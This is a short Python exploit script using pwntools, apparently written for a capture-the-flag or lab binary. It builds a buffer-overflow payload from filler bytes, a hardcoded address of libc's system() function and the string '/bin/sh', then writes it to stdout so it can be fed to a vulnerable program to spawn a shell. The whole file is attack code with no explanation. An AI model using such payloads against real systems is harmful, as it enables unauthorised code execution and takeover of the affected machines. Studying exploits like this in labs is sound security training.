from pwn import *

# print = lambda *args, **kwargs: None # override print function

system_function = 0xf7dcd430

arg1 = b'a'*8
arg1 += p32(system_function)

arg2 = b'a'*8
arg2 += b'/bin/sh'

payload = arg1 + b" " + arg2

sys.stdout.buffer.write(payload)
